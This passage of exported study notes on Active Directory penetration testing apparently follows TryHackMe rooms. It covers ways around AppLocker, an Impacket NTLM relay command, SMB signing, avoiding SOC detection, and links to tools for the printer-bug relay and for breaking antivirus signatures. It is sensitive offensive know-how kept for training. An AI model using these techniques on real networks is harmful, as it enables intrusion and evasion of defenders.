class="">AppLocker</h2><ul id="b3d4289f-dc7d-424a-a6fc-a0fe44db869d" class="bulleted-list"><li style="list-style-type:disc">specifies programs that are allowed to run on computer based off of policies (located in <code>secpol.msc</code>)</li></ul><ul id="af9cebe0-d708-4fbf-9850-a5d541178101" class="bulleted-list"><li style="list-style-type:disc">restricts access to sections of device or multiple devices in domain</li></ul><p id="6182c418-1b25-420a-83fc-323f8548ce14" class="">Following error is received when AppLocker blocks a program from running:</p><pre id="0f0b5894-c7e1-43a6-98df-f5fa3be306ee" class="code"><code>This program is blocked by group policy. For more information, contact your system administrator.</code></pre><p id="c052b80e-bd88-4b8c-9208-7a4986fbe519" class="">Example rule:</p><figure id="28df1894-df62-4409-a144-b2e1c49b368a" class="image"><a href="../../../../images/Active%20Directory%20Pentesting%2013bdf411f877497282c549a5fd16d4c9/Untitled%209.png"><img style="width:535px" src="../../../../images/Active%20Directory%20Pentesting%2013bdf411f877497282c549a5fd16d4c9/Untitled%209.png"/></a></figure><h3 id="ca19611c-1377-474a-9690-f89e91fe55ed" class="">Bypass</h3><ul id="2a193974-f09c-4b9a-a09a-f5c7db594dde" class="bulleted-list"><li style="list-style-type:disc">abuse misconfigured policies</li></ul><ul id="dc44fc9a-0747-4dce-924c-2a574d2260ff" class="bulleted-list"><li style="list-style-type:disc">perform PowerShell downgrade </li></ul><ul id="ac4fe4dd-b25e-4325-9b17-15e4bdbc9004" class="bulleted-list"><li style="list-style-type:disc"><a href="https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/Generic-AppLockerbypasses.md">https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/Generic-AppLockerbypasses.md</a></li></ul><p id="e517e0b9-a19d-462d-8f4d-5ee3b4a40a53" class="">
</p><p id="ea61c34f-ecb9-4a0a-8ce3-b78ee42c9191" class="">
</p><h1 id="2284ab40-78de-4f24-804d-78199ca69b17" class="">Misc</h1><h2 id="d05d410c-9e94-4734-9f41-edfec59321c3" class="">Change User Password</h2><p id="77089655-ea9d-42e5-8f59-431aed5551b6" class=""><code>Set-ADAccountPassword -Identity &lt;USER&gt; -Server &lt;DOMAIN&gt; -OldPassword (ConvertTo-SecureString -AsPlaintext &quot;&lt;OLD_PASSWORD&gt;&quot; -force) -NewPassword (ConvertTo-SecureString -AsPlainText &quot;&lt;NEW_PASSWORD&gt;&quot; -Force)</code></p><h2 id="49705e23-d328-422f-a785-199d0161125b" class="">Hostname vs IP</h2><p id="d49a8141-c5e1-4a02-a580-cb42f8a41260" class=""><code>dir \\&lt;HOSTNAME&gt;\SHARE</code> vs. <code>dir \\&lt;DC_IP&gt;\Share</code></p><ul id="dbc4c193-1a76-4688-bd44-2e7de351dbc7" class="bulleted-list"><li style="list-style-type:disc">authenticating with hostname is done using Kerberos, while authenticating with IP is done with NTLM</li></ul><ul id="500c5ca3-00d5-48e4-b64c-ff18a7d2105c" class="bulleted-list"><li style="list-style-type:disc">keep in mind as SOC may be monitoring Overpass-The-Hash (used in attacks against Kerberos) and/or Pass-The-Hash (used in attacks against NTLM) </li></ul><h2 id="2d7126e4-8296-4050-937a-690e6ed3d494" class="">Create Credential Block</h2><pre id="9a4f43c4-5d00-4e95-aac8-cbdacdc1fdfb" class="code code-wrap"><code>$username = &#x27;Administrator&#x27;;
$password = &#x27;Mypass123&#x27;;
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;</code></pre><p id="655cf8df-56e9-41dc-8fdb-72f22646dbcb" class="">
</p><h1 id="850c4e3b-82e8-4351-b8db-88ab18b3b130" class="">SMB</h1><h2 id="82a704e8-0b28-4d33-800f-5727a71f6ccb" class="">Shares</h2><figure id="f249be77-fca7-4be3-828a-4fac43deb223" class="image"><a href="../../../../images/Active%20Directory%20Pentesting%2013bdf411f877497282c549a5fd16d4c9/Untitled%2010.png"><img style="width:704px" src="../../../../images/Active%20Directory%20Pentesting%2013bdf411f877497282c549a5fd16d4c9/Untitled%2010.png"/></a></figure><ul id="2ada420d-3c0e-4e7d-8be4-1dc6777a36ed" class="bulleted-list"><li style="list-style-type:disc">note that files within <code>ADMIN$</code> are in <code>C:\Windows</code> and <code>C$</code> is in <code>C:\</code></li></ul><h2 id="d285c933-7a31-40f3-a063-2381ca68d9ef" class="">Signing</h2><ul id="8319f274-098d-486a-9d72-5b8fa8b00dc8" class="bulleted-list"><li style="list-style-type:disc">signing is often enabled but not enforced as some legacy systems do not support SMB signing</li></ul><ul id="02ec16f6-e3c6-480b-a2a8-211384a759cb" class="bulleted-list"><li style="list-style-type:disc">when hosting an SMB server, ensure that the server does not support SMB signing </li></ul><p id="70b2c5e6-a3d1-495e-aadf-e9b379ec280c" class="">
</p><p id="94fbefba-c651-45c7-86f9-fdd58c86e49c" class="">
</p><h2 id="cd89496e-4432-4a7d-954a-c27846ef1bc7" class="">Impacket</h2><h3 id="cf007439-fe67-4ef6-b21e-8e6ad9d42be0" class="">NTLM Relay</h3><pre id="b8ba43bc-cacd-4996-a123-481369278957" class="code"><code>python3 /opt/impacket/examples/ntlmrelayx.py -smb2support -t smb://&quot;&lt;TARGET_IP&gt;&quot; -debug</code></pre><ul id="774968de-dd36-40de-af5e-a44dc3a97ddf" class="bulleted-list"><li style="list-style-type:disc">note that you should specify the IP instead of hostname<ul id="f9caf5b5-c9e2-417a-9dc0-3a2c277861e1" class="bulleted-list"><li style="list-style-type:circle">specifying hostname could cause server to use Kerberos authentication instead of NTLM </li></ul></li></ul><p id="aa1550be-3476-48d0-8307-5588251d67fe" class="">
</p><p id="63d01ff5-8c96-4be5-a204-0d5d9664eb07" class="">
</p><h1 id="fa729c7b-ffa6-4817-b5e8-875d3a827911" class="">Tools</h1><h2 id="7726dafa-59f1-4434-9ed4-5009eb4eee22" class="">Recon</h2><p id="f34df1d4-723d-48db-9cae-871a63653e86" class=""><a href="https://github.com/BloodHoundAD/BloodHound">https://github.com/BloodHoundAD/BloodHound</a></p><ul id="8ee4fbf4-77bd-4499-97dd-ad6e69a6e726" class="bulleted-list"><li style="list-style-type:disc">maps out environment for privesc vectors</li></ul><p id="657b2757-f262-446f-9e56-a417afbc9e5e" class=""><a href="https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon">https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon</a></p><h2 id="b6cd0ca1-bc0e-4a80-a081-661ec448ef08" class="">Exploitation</h2><p id="7d84f5c9-aca4-4108-8663-b31d9f602430" class=""><a href="https://github.com/leechristensen/SpoolSample">https://github.com/leechristensen/SpoolSample</a></p><ul id="66a2f21d-0018-49f7-b2b9-d5eda57680ab" class="bulleted-list"><li style="list-style-type:disc">Used for exploiting printer bug for authentication relaying</li></ul><p id="02721025-bea1-4b09-a9f3-bcf568a03d3c" class="">
</p><h2 id="00f1d15a-1cc2-426f-b7a3-20f1d00d9ab4" class="">AMSI Bypassing</h2><p id="3abf94aa-e9cd-47d0-bad0-640c97f8c0fc" class=""><a href="https://github.com/rasta-mouse/ThreatCheck">https://github.com/rasta-mouse/ThreatCheck</a></p><p id="0e9ecc64-68e9-4355-8ff2-a09d9e6c2d70" class=""><a href="https://github.com/matterpreter/DefenderCheck">https://github.com/matterpreter/DefenderCheck</a></p><ul id="2d32fc50-f07a-456b-9243-2c1ca1fdf356" class="bulleted-list"><li style="list-style-type:disc">outputs bytes attached to signatures of file</li></ul><ul id="b81c4740-ea14-46a6-b8a4-8faf333466b2" class="bulleted-list"><li style="list-style-type:disc">useful for helping break signatures for AV evasion</li></ul><p id="2b08a689-2bb2-416d-b68b-bdd6a628ca4e" class="">
</p><h1 id="83d65774-8c3e-4df2-ab01-4bf7226a0b8a" class="">References</h1><h2 id="15e11dc4-5cd8-41b3-9ce0-dbbfe9b25b18" class="">TryHackMe Resources</h2><p id="e02e013c-fa83-486b-b342-15b551761def" class=""><a href="https://tryhackme.com/room/breachingad">https://tryhackme.com/room/breachingad</a></p><p id="b1e158d7-fea9-4a74-b3aa-a293df2da8b9" class=""><a href="https://tryhackme.com/room/winadbasics">https://tryhackme.com/room/winadbasics</a></p><p id="40c5bc6a-fc61-4bbd-8785-444af6319eef" class=""><a href="https://tryhackme.com/room/adenumeration">https://tryhackme.com/room/adenumeration</a></p><p id="fbaf1eea-478e-4809-bd7a-7b73391eeeed" class=""><a href="https://tryhackme.com/room/lateralmovementandpivoting">https://tryhackme.com/room/lateralmovementandpivoting</a>
</p><h2 id="a78ef902-4b83-45e1-9490-2804dc40faaf" class="">Misc Resources</h2><p id="7c79adfe-c655-4fde-a153-27dddf3c2c81" class=""><a href="https://media.licdn.com/dms/document/C4E1FAQHJHVVqztQj7Q/feedshare-document-pdf-analyzed/0/1672038819682?e=1672876800&amp;v=beta&amp;t=AqTRIRJD1vWHJNHKBVOlnn1_F6unpVcmMwJVDs_LM0Y">https://media.licdn.com/dms/document/C4E1FAQHJHVVqztQj7Q/feedshare-document-pdf-analyzed/0/1672038819682?e=1672876800&amp;v=beta&amp;t=AqTRIRJD1vWHJNHKBVOlnn1_F6unpVcmMwJVDs_LM0Y</a></p><p id="b27ea1d1-439b-4aa4-81ad-d8662dcabebb" class="">
</p></div></body></html>
